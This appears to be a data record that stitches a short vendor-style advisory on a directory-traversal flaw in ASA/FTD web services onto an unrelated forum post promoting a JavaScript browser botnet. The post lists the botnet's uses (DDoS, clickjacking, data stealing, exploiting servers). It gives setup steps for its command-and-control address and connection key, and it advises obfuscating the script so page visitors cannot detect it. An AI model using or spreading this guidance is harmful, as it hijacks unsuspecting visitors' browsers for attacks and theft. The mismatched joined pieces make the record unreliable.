The vulnerability is due to a lack of proper input validation of URLs in HTTP requests processed by an affected device. An attacker could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences to an affected device. A successful exploit could allow the attacker to view arbitrary files within the web services file system on the targeted device. The web services file system is enabled when the affected device is configured with either WebVPN or AnyConnect features. This vulnerability cannot be used to obtain access to ASA or FTD system files or underlying operating system (OS) files.|

Then whoever visits the page will be on the botnet for as long as they are on the page.  I suggest putting a movie on the page so people will stay on the botnet for longer. (Good for ddos attacks)  For those of you who dont know the purposes of this botnet are:      Website monitoring     Ad clicks amd views     Getting facebook likes (via clickjacking)     Distributed hash cracking     Distributed Denial of Service (DDoS)     Data stealing     IP grabbing     Exploiting servers     and many more!

If you have any suggestions for new features send me a PM and I should reply in 1-3 days  Here is how to set it up: Code You need to change the master variable in campaign.js to something like this:  var master = %http://yoursiteorip%;  Also change the connection key for security.  var connectKey = %randomshithere%;  Also be sure to edit config.php and change the connection key to the one in campaign.js  Also in the config it is reccommended that you change the location of the log files and other file locations etc. Be sure to rename/move the files to the places you specified in the config.  Once you are done those things obfuscate your campaign.js using this JavaScript obfuscator (or a different one) http://javascriptobfuscator.com/Javascript-Obfuscator.aspx  That will protect your campaign.js from people figuring out what it is. | https://github.com/x1234xx/CLOUD-9-JAVASCRIPT-BOTNET-VERSION-2.0 | 0 | 0|
